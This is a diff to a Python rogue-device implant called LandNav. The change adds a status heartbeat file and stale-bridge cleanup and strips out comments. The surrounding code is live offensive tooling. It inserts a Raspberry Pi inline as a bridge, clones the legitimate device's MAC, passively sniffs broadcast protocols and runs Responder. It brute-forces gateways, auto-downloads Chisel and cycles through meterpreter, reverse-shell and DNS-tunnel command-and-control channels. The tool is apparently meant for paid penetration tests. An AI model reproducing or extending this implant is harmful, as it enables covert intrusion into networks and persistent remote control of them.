@@ -20,10 +20,11 @@ Usage:
     python3 landnav.py --status         # Print current state and exit
 """
 
-VERSION = "0.7.1"
+VERSION = "0.8.0"
 
 import argparse
 import datetime
+import json
 import logging
 import logging.handlers
 import os
@@ -33,6 +34,7 @@ import signal
 import subprocess
 import sys
 import tempfile
+import threading
 import time
 import yaml
 from pathlib import Path
@@ -53,6 +55,7 @@ from lib.responder import ResponderAnalyzer
 
 DEFAULT_CONFIG = _HERE / "config.yaml"
 LOCK_FILE = Path("/var/run/landnav.pid")
+STATUS_FILE = Path("/var/run/landnav_status.json")
 CLIENTS_BASE = Path("/clients")
 CLEANUP_AGE_DAYS = 30
 
@@ -64,6 +67,43 @@ _run_dir = None
 # Passive recon + Responder handles (module-level for status/cleanup)
 _passive_collector = None
 _responder_analyzer = None
+
+# Status heartbeat
+_heartbeat_stop = threading.Event()
+_start_time = datetime.datetime.now().isoformat()
+
+# ── Status Heartbeat ───────────────────────────────────────────
+
+def _write_status():
+    try:
+        data = {
+            "pid": os.getpid(),
+            "version": VERSION,
+            "started": _start_time,
+            "c2_state": egress._current_state,
+            "c2_method": egress._c2_method,
+            "last_heartbeat": datetime.datetime.now().isoformat(),
+        }
+        tmp = str(STATUS_FILE) + ".tmp"
+        with open(tmp, "w") as f:
+            json.dump(data, f)
+        os.replace(tmp, str(STATUS_FILE))
+    except Exception:
+        pass
+
+def _heartbeat_loop():
+    while not _heartbeat_stop.is_set():
+        _write_status()
+        _heartbeat_stop.wait(30)
+
+def _start_heartbeat():
+    t = threading.Thread(target=_heartbeat_loop, daemon=True)
+    t.start()
+    return t
+
+def _stop_heartbeat():
+    _heartbeat_stop.set()
+    STATUS_FILE.unlink(missing_ok=True)
 
 # ── Run Directory ───────────────────────────────────────────────
 
@@ -89,12 +129,11 @@ def cleanup_old_runs():
     for entry in CLIENTS_BASE.iterdir():
         if not entry.is_dir() or not entry.name.startswith("landnav_"):
             continue
-        # Parse timestamp from directory name: landnav_YYYYMMDD_HHMMSS
         try:
             ts_str = entry.name[len("landnav_"):]
             dir_time = datetime.datetime.strptime(ts_str, "%Y%m%d_%H%M%S")
         except ValueError:
-            continue  # Not a valid landnav run dir
+            continue
 
         if dir_time < cutoff:
             log.info("Cleaning up old run directory: %s", entry)
@@ -137,12 +176,11 @@ def acquire_lock():
     if LOCK_FILE.exists():
         try:
             old_pid = int(LOCK_FILE.read_text().strip())
-            # Check if old process is still running
             os.kill(old_pid, 0)
             log.error("Another LandNav instance is running (PID %d)", old_pid)
             return False
         except (OSError, ValueError):
-            pass  # Stale PID file
+            pass
     LOCK_FILE.write_text(str(os.getpid()))
     return True
 
@@ -156,8 +194,6 @@ _shutdown = False
 def _handle_signal(signum, frame):
     global _shutdown
     _shutdown = True
-    # Kill any blocking child (pty.spawn / iodine) so we actually exit.
-    # force_shutdown is signal-safe — no logging inside it.
     egress.force_shutdown()
 
 # ── Phase 1: Interface Detection ───────────────────────────────
@@ -177,9 +213,6 @@ def phase_detect_interfaces(cfg):
     log.info("════════ Phase 1: Interface Detection ════════")
 
     # ── Step 1: Check for existing system-managed bridge ───────
-    # If a system bridge already has the uplink and connectivity,
-    # LandNav adds the USB-ethernet downstream to it rather than
-    # creating a separate bridge (the uplink can't be in two bridges).
     if netconfig.interface_exists(bridge.BRIDGE_NAME):
         br_info = netconfig.get_interface_info(bridge.BRIDGE_NAME)
         br_members = netconfig.get_bridge_ports(bridge.BRIDGE_NAME)
@@ -189,8 +222,6 @@ def phase_detect_interfaces(cfg):
                  br_members, is_system)
 
         if is_system and br_info["ip"] and br_info["state"] == "UP":
-            # System bridge is live — find any non-bridge-member ethernet
-            # to add as a downstream port
             ifaces = netconfig.detect_interfaces()
             log.info("Detected physical interfaces: %s", ifaces)
             downstream = None
@@ -280,7 +311,6 @@ def _setup_bridge_reuse_mode(net_cfg, iface_info):
     br_info = netconfig.get_interface_info(bridge.BRIDGE_NAME)
     log.info("Using existing bridge %s: IP=%s", bridge.BRIDGE_NAME, br_info["ip"])
 
-    # Add downstream to the existing bridge if present
     downstream = iface_info.get("downstream")
     if downstream:
         if bridge.add_port(downstream):
@@ -296,7 +326,6 @@ def _setup_bridge_reuse_mode(net_cfg, iface_info):
     config.cidr = br_info["cidr"] or 24
     config.discovery_method = "existing-bridge"
 
-    # Read gateway from routing table
     try:
         r = subprocess.run(["ip", "route", "show", "default"],
                          capture_output=True, text=True, check=False, timeout=5)
@@ -306,7 +335,6 @@ def _setup_bridge_reuse_mode(net_cfg, iface_info):
     except Exception:
         pass
 
-    # Read DNS from resolv.conf
     try:
         resolv = Path("/etc/resolv.conf").read_text()
         config.dns_servers = [
@@ -316,7 +344,6 @@ def _setup_bridge_reuse_mode(net_cfg, iface_info):
     except Exception:
         config.dns_servers = net_cfg.get("fallback_dns", ["8.8.8.8"])
 
-    # Enable promiscuous mode for passive recon
     try:
         netconfig.set_interface_promisc(bridge.BRIDGE_NAME, True)
     except Exception:
@@ -331,7 +358,6 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
     """Bridge mode network setup."""
     bridge_cfg = net_cfg.get("bridge", {})
 
-    # Create the bridge
     led.set_state(led.BRIDGE_UP)
     if not bridge.create_bridge(uplink, downstream, stp=bridge_cfg.get("stp", False)):
         log.error("Bridge creation failed — falling back to standalone")
@@ -340,17 +366,14 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
     log.info("Bridge active — sniffing for legitimate device traffic")
     led.set_state(led.DISCOVERY)
 
-    # Learn the downstream device's MAC
     legit_mac = bridge.get_downstream_mac(downstream,
                                            timeout=disc_cfg.get("dhcp_timeout", 30))
 
-    # Sniff DHCP from the legitimate device
     net_config = discovery.sniff_dhcp(
         bridge.BRIDGE_NAME,
         timeout=disc_cfg.get("dhcp_timeout", 30),
     )
 
-    # If no DHCP, try ARP observation
     if not net_config.gateway:
         log.info("No DHCP observed — trying ARP sniff")
         arp_config = discovery.sniff_arp(
@@ -360,7 +383,6 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
         if arp_config.gateway:
             net_config = arp_config
 
-    # If still no gateway, try LLDP/CDP
     if not net_config.gateway:
         log.info("No ARP data — trying LLDP/CDP")
         switch_info = discovery.sniff_lldp_cdp(bridge.BRIDGE_NAME, timeout=65)
@@ -368,20 +390,17 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
             log.info("Switch management IP: %s (VLAN: %s)",
                      switch_info["mgmt_ip"], switch_info.get("vlan"))
 
-    # Extended sniff if first pass failed
     if not net_config.gateway:
         ext_timeout = disc_cfg.get("sniff_extended", 300)
         log.info("Extended passive sniff (%ds)", ext_timeout)
         net_config = discovery.sniff_arp(bridge.BRIDGE_NAME, timeout=ext_timeout)
 
-    # Active probing as fallback
     if not net_config.gateway:
         log.info("Passive sniffing failed — active ARP probing")
         probe_result = discovery.probe_for_gateway(bridge.BRIDGE_NAME)
         if probe_result:
             net_config = probe_result
 
-    # Brute force as last resort
     if not net_config.gateway and disc_cfg.get("brute_force", True):
         log.info("Active probing failed — brute force")
         bf_result = discovery.brute_force_subnet(
@@ -395,15 +414,12 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
         log.error("All network discovery methods failed")
         return None
 
-    # Use legit device's MAC if discovered
     if legit_mac:
         net_config.client_mac = legit_mac
 
-    # Set up MAC transparency
     if bridge_cfg.get("mac_transparency", True) and net_config.client_mac:
         bridge.set_mac_transparency(net_config.client_mac, uplink)
 
-    # Find an unused IP for the Pi
     if not net_config.cidr:
         net_config.cidr = 24
 
@@ -421,7 +437,6 @@ def _setup_bridge_mode(uplink, downstream, net_cfg, disc_cfg):
 
     net_config.ip = pi_ip
 
-    # Configure the Pi's IP on the bridge
     dns_servers = net_config.dns_servers or net_cfg.get("fallback_dns", ["8.8.8.8"])
     bridge.configure_bridge_ip(
         pi_ip, net_config.cidr, net_config.gateway,
@@ -435,7 +450,6 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
     """Standalone mode (eth0 only) network setup."""
     led.set_state(led.DISCOVERY)
 
-    # Step 1: Check if we already have connectivity
     info = netconfig.get_interface_info(uplink)
     if info["ip"]:
         log.info("Interface %s already has IP %s — checking connectivity", uplink, info["ip"])
@@ -446,7 +460,6 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
             config.discovery_method = "preexisting"
             return config
 
-    # Step 2: Try DHCP
     log.info("Attempting DHCP on %s", uplink)
     if netconfig.run_dhclient(uplink, timeout=disc_cfg.get("dhcp_timeout", 30)):
         info = netconfig.get_interface_info(uplink)
@@ -454,7 +467,6 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
         config.ip = info["ip"]
         config.cidr = info["cidr"] or 24
         config.discovery_method = "dhcp"
-        # Read gateway from routing table
         try:
             r = subprocess.run(["ip", "route", "show", "default"],
                              capture_output=True, text=True, check=False, timeout=5)
@@ -468,28 +480,23 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
 
     netconfig.release_dhcp(uplink)
 
-    # Step 3: Passive sniff (ARP)
     log.info("DHCP failed — passive ARP sniff")
-    # Need a temporary IP-less config to sniff
     netconfig.set_interface_up(uplink)
     netconfig.set_interface_promisc(uplink, True)
 
     net_config = discovery.sniff_arp(uplink, timeout=disc_cfg.get("sniff_timeout", 60))
 
-    # Extended sniff if needed
     if not net_config.gateway:
         ext = disc_cfg.get("sniff_extended", 300)
         log.info("Short sniff failed — extended sniff (%ds)", ext)
         net_config = discovery.sniff_arp(uplink, timeout=ext)
 
-    # Step 4: Active ARP probing
     if not net_config.gateway:
         log.info("Passive sniff failed — active ARP probing")
         probe = discovery.probe_for_gateway(uplink)
         if probe:
             net_config = probe
 
-    # Step 5: Brute force
     if not net_config.gateway and disc_cfg.get("brute_force", True):
         log.info("Active probing failed — brute force")
         bf = discovery.brute_force_subnet(
@@ -502,7 +509,6 @@ def _setup_standalone_mode(uplink, net_cfg, disc_cfg):
         log.error("All standalone discovery methods failed")
         return None
 
-    # Assign an IP
     if not net_config.cidr:
         net_config.cidr = 24
 
@@ -539,21 +545,18 @@ def phase_validate_network(net_config, cfg):
         log.error("No network configuration to validate")
         return False
 
-    # Layer 2: ARP the gateway
     if net_config.gateway:
         if netconfig.can_reach_gateway(net_config.gateway):
             log.info("✓ Gateway %s reachable (Layer 2)", net_config.gateway)
         else:
             log.warning("✗ Gateway %s unreachable via ARP", net_config.gateway)
 
-    # Layer 3: Ping the gateway
     if net_config.gateway:
         if netconfig.ping(net_config.gateway):
             log.info("✓ Gateway %s responds to ping (Layer 3)", net_config.gateway)
         else:
             log.warning("✗ Gateway %s does not respond to ping", net_config.gateway)
 
-    # DNS: Discover and test servers
     net_cfg = cfg.get("network", {})
     fallback_dns = net_cfg.get("fallback_dns", ["8.8.8.8", "1.1.1.1"])
 
@@ -571,17 +574,14 @@ def phase_validate_network(net_config, cfg):
         net_config.dns_servers = fallback_dns
         netconfig.set_dns(fallback_dns)
 
-    # Test DNS resolution
     resolved = netconfig.dns_resolves(cfg["c2"]["host"])
     if resolved:
         log.info("✓ DNS resolves %s → %s", cfg["c2"]["host"], resolved)
     else:
         log.warning("✗ Cannot resolve %s — C2 may need IP fallback", cfg["c2"]["host"])
 
-    # Proxy detection
     proxy_cfg = net_cfg.get("proxy", {})
     if proxy_cfg.get("host"):
-        # Manual proxy
         net_config.proxy_host = proxy_cfg["host"]
         net_config.proxy_port = proxy_cfg["port"]
         log.info("Using manual proxy: %s:%d", net_config.proxy_host, net_config.proxy_port)
@@ -594,7 +594,6 @@ def phase_validate_network(net_config, cfg):
         else:
             log.info("No proxy detected")
 
-    # Internet connectivity
     if netconfig.internet_reachable():
         log.info("✓ Internet reachable")
     else:
@@ -606,14 +605,7 @@ def phase_validate_network(net_config, cfg):
 # ── Passive Recon Launch ───────────────────────────────────────
 
 def start_passive_recon(iface_info, cfg):
-    """Start passive network intelligence collection and Responder analyzer.
-
-    Runs as background daemon threads — collects ARP, DNS, DHCP, NetBIOS,
-    LLMNR, mDNS, SSDP traffic plus Responder analyze-mode output.
-    Continues running for the entire lifetime of the deployment.
-
-    Returns: (PassiveCollector, ResponderAnalyzer) or (None, None)
-    """
+    """Start passive network intelligence collection and Responder analyzer."""
     global _passive_collector, _responder_analyzer
 
     passive_cfg = cfg.get("passive", {})
@@ -623,7 +615,6 @@ def start_passive_recon(iface_info, cfg):
         log.info("Passive recon disabled in config")
         return None, None
 
-    # Use bridge interface if in bridge mode, otherwise uplink
     if iface_info["mode"] == "bridge" and bridge.bridge_is_up():
         sniff_iface = bridge.BRIDGE_NAME
     else:
@@ -633,7 +624,6 @@ def start_passive_recon(iface_info, cfg):
 
     log.info("════════ Passive Recon: Starting ════════")
 
-    # Start passive packet collector
     flush_interval = passive_cfg.get("flush_interval", 30)
     _passive_collector = PassiveCollector(
         iface=sniff_iface,
@@ -644,7 +634,6 @@ def start_passive_recon(iface_info, cfg):
     log.info("Passive collector started on %s (flush every %ds)",
              sniff_iface, flush_interval)
 
-    # Start Responder in analyze mode
     if responder_cfg.get("enabled", True):
         responder_path = responder_cfg.get("path")
         _responder_analyzer = ResponderAnalyzer(
@@ -689,7 +678,6 @@ def phase_c2_egress(net_config, cfg):
     log.info("════════ Phase 4: C2 Egress Cascade ════════")
     led.set_state(led.C2_ATTEMPT)
 
-    # Inject detected proxy into config for egress module
     if net_config.proxy_host:
         cfg["_detected_proxy_host"] = net_config.proxy_host
         cfg["_detected_proxy_port"] = net_config.proxy_port
@@ -700,7 +688,6 @@ def phase_c2_egress(net_config, cfg):
         log.info("════════ C2 ESTABLISHED via %s ════════", method)
         led.set_state(led.C2_CONNECTED)
 
-        # Log passive recon status for operator awareness
         if _passive_collector:
             log.info("Passive recon active: %d hosts, %d subnets observed",
                      _passive_collector.get_host_count(),
@@ -718,19 +705,8 @@ def phase_c2_egress(net_config, cfg):
 _AUTO_CMD_PATH = _HERE / "auto_commands.txt"
 
 def _generate_auto_commands(cfg: dict):
-    """Rewrite auto_commands.txt based on config.
-
-    When SSH tunnels or Chisel are configured, their local_port values
-    overlap with the portfwd rules in auto_commands.txt.  Metasploit's
-    portfwd binds IPv4 first (AutoRunScript runs on session-open), so the
-    tunnels — started later — can only get IPv6.  All IPv4 connections
-    then go to the portfwd (which is single-threaded through the meterpreter
-    transport and unusable for browsable web services).
-
-    Fix: strip portfwd lines whose local port matches a tunnel port
-    (SSH or Chisel).  The tunnels become the sole forwarding mechanism for
-    those services.  Non-overlapping portfwd lines are preserved so the
-    system handles mixed configurations.
+    """Rewrite auto_commands.txt — strip portfwd lines that overlap with
+    SSH tunnel or Chisel forwards.
     """
     tunnel_ports: set = set()
 
@@ -761,7 +737,6 @@ def _generate_auto_commands(cfg: dict):
     for line in original_lines:
         raw = line.strip()
         if raw.startswith("portfwd") and tunnel_ports:
-            # Parse: portfwd add -l <port> -p <rport> -r <host>
             parts = raw.split()
             try:
                 li = parts.index("-l")
@@ -792,17 +767,7 @@ _CHISEL_ARCH_MAP = {
 
 
 def _ensure_config_current(cfg, config_path):
-    """Sync live config with config.yaml.example.
-
-    Three levels of merge:
-      1. Missing top-level sections → added wholesale
-      2. Missing keys within existing sections → added with example defaults
-      3. Changed defaults in example → updated in live config
-
-    User-set values that differ from BOTH the old and new example defaults
-    are never touched.  Only values that still match the previous example
-    default get upgraded to the new one.
-    """
+    """Sync live config with config.yaml.example."""
     example_path = _HERE / "config.yaml.example"
     if not example_path.exists():
         return cfg
@@ -818,13 +783,11 @@ def _ensure_config_current(cfg, config_path):
 
     for section_key, example_section in example_cfg.items():
         if section_key not in cfg:
-            # Whole section missing — add it
             cfg[section_key] = example_section
             log.info("Config: added missing section: %s", section_key)
             changed = True
             continue
 
-        # Deep-merge: add missing keys and update changed defaults
         if isinstance(example_section, dict) and isinstance(cfg[section_key], dict):
             live_section = cfg[section_key]
             for key, example_val in example_section.items():
@@ -834,16 +797,11 @@ def _ensure_config_current(cfg, config_path):
                              section_key, key, example_val)
                     changed = True
 
-    # ── Version migrations: update stale defaults ──────────────
-    # v0.6.4: chisel default port changed from 443 to 8443
-    #         (443 conflicts with existing web servers on most C2 hosts)
     if cfg.get("chisel", {}).get("server_port") == 443:
         cfg["chisel"]["server_port"] = 8443
         log.info("Config: migrated chisel.server_port 443 → 8443")
         changed = True
 
-    # v0.6.9: chisel SOCKS port 1080 → 1081
-    #         (1080 conflicts with Metasploit's SOCKS proxy in listener.rc)
     if cfg.get("chisel", {}).get("socks_port") == 1080:
         cfg["chisel"]["socks_port"] = 1081
         log.info("Config: migrated chisel.socks_port 1080 → 1081")
@@ -861,11 +819,7 @@ def _ensure_config_current(cfg, config_path):
 
 
 def _ensure_chisel_binary():
-    """Download the chisel binary if not in PATH.
-
-    Architecture-aware: detects arm64 (Pi 4/5), amd64 (x86), armv7/v6.
-    Uses curl (a LandNav dependency) for the download.
-    """
+    """Download the chisel binary if not in PATH."""
     if shutil.which("chisel"):
         return
 
@@ -897,10 +851,9 @@ def _ensure_chisel_binary():
             log.error("Chisel download failed: %s", rc.stderr[:300])
             return
 
-        # Decompress: gunzip replaces file.gz with file
         subprocess.run(["gunzip", "-f", tmp_gz],
                        capture_output=True, timeout=30)
-        tmp_bin = tmp_gz[:-3]  # gunzip strips .gz
+        tmp_bin = tmp_gz[:-3]
 
         shutil.move(tmp_bin, str(dest))
         dest.chmod(0o755)
@@ -909,7 +862,6 @@ def _ensure_chisel_binary():
     except Exception as e:
         log.error("Chisel auto-install failed: %s", e)
     finally:
-        # Clean up temp files
         if tmp_gz:
             for p in (tmp_gz, tmp_gz.replace(".gz", "")):
                 try:
@@ -943,7 +895,7 @@ def _ensure_ssh_keys():
 # ── Main ────────────────────────────────────────────────────────
 
 def main():
-    global _shutdown, _run_dir
+    global _shutdown, _run_dir, _start_time
 
     parser = argparse.ArgumentParser(
         description="LandNav v%s — Rogue device network bootstrapper" % VERSION,
@@ -961,7 +913,6 @@ def main():
                         version=f"LandNav {VERSION}")
     args = parser.parse_args()
 
-    # Load config
     config_path = Path(args.config)
     if not config_path.exists():
         print(f"ERROR: Config file not found: {config_path}", file=sys.stderr)
@@ -971,18 +922,10 @@ def main():
     with open(config_path) as f:
         cfg = yaml.safe_load(f)
 
-    # Prep-handler mode — strip auto_commands.txt and exit.
-    # Run this on the C2 server (the C2 server) before starting msfconsole.
-    # LandNav's main startup (below) also calls _generate_auto_commands()
-    # for the same-machine case, but when the implant (beretta) and the
-    # handler (the C2 server) are separate machines, the implant-side strip has
-    # no effect on the C2 server's copy.  This mode lets listener.rc trigger
-    # the strip on the C2 server via a <ruby> system() call.
     if args.prep_handler:
         _generate_auto_commands(cfg)
         sys.exit(0)
 
-    # Status mode — quick read, no side effects
     if args.status:
         print(f"LandNav v{VERSION}")
         print(f"C2 State: {egress._current_state}")
@@ -996,34 +939,33 @@ def main():
             print(f"Responder: ACTIVE (analyze mode)")
         sys.exit(0)
 
-    # Create run directory under /clients
     _run_dir = create_run_dir()
 
-    # Setup logging (writes to run dir)
     setup_logging(_run_dir, cfg.get("logging", {}))
+    _start_time = datetime.datetime.now().isoformat()
     log.info("LandNav v%s starting", VERSION)
     log.info("Run directory: %s", _run_dir)
 
-    # Auto-setup: merge new config sections, install binaries, generate keys
     cfg = _ensure_config_current(cfg, config_path)
     _ensure_chisel_binary()
     _ensure_ssh_keys()
 
-    # Generate auto_commands.txt — strip portfwd for SSH-tunneled ports
     _generate_auto_commands(cfg)
 
-    # Clean up old run directories (>%d days)
     cleanup_old_runs()
 
-    # PID lock
+    # Clean up stale bridges from prior runs before detecting interfaces
+    bridge.cleanup_stale_bridges()
+
     if not acquire_lock():
         sys.exit(1)
 
-    # Signal handlers
+    # Start status heartbeat for external watchdog
+    _start_heartbeat()
+
     signal.signal(signal.SIGTERM, _handle_signal)
     signal.signal(signal.SIGINT, _handle_signal)
 
-    # Initialize LED
     led_cfg = cfg.get("led", {})
     led.init(
         led_path=led_cfg.get("path", "/sys/class/leds/ACT"),
@@ -1065,20 +1007,14 @@ def main():
             method = phase_c2_egress(net_config, cfg)
 
             if method:
-                # For blocking methods (meterpreter/reverse_shell),
-                # _current_state is already FAILED by the time we get
-                # here — the session lived and died inside the call.
-                # Check immediately before starting the watchdog.
                 if egress._current_state == egress.EgressState.FAILED:
                     log.warning("C2 session ended (%s) — re-entering cascade", method)
                     led.set_state(led.C2_ATTEMPT)
                     continue
 
-                # C2 is alive (dns_tunnel) — start watchdog and wait
                 log.info("C2 active via %s — starting watchdog", method)
                 egress.start_watchdog(cfg, on_reconnect=lambda m: led.set_state(led.C2_CONNECTED))
 
-                # Block until shutdown or C2 failure
                 while not _shutdown:
                     time.sleep(5)
                     if egress._current_state == egress.EgressState.FAILED:
@@ -1091,7 +1027,6 @@ def main():
                 if _shutdown:
                     break
             else:
-                # All methods failed — wait and retry
                 log.info("Retrying C2 cascade in %ds", retry_interval)
                 led.set_state(led.ERROR)
 
@@ -1107,14 +1042,13 @@ def main():
         log.info("LandNav shutting down")
         led.set_state(led.SHUTDOWN)
 
-        # Stop passive recon and flush final data
+        _stop_heartbeat()
+
         stop_passive_recon()
 
         time.sleep(3)
         led.stop()
 
-        # Cleanup bridge — destroy_bridge() is safe: it checks the marker
-        # file and refuses to touch system-managed or non-LandNav bridges.
         bridge.destroy_bridge()
 
         release_lock()
